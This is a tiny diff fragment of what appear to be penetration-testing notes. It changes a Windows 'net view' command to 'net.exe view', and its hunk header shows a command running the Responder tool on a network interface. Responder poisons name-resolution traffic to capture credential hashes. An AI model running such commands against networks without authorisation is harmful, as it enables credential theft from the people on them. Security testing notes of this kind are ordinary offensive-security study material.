@@ -11,5 +11,5 @@ $ sudo responder -I <interface> -rdwv
 ## 1.2 - Target
 
 ```
-C:\> net view \\snare
+C:\> net.exe view \\snare
 ```
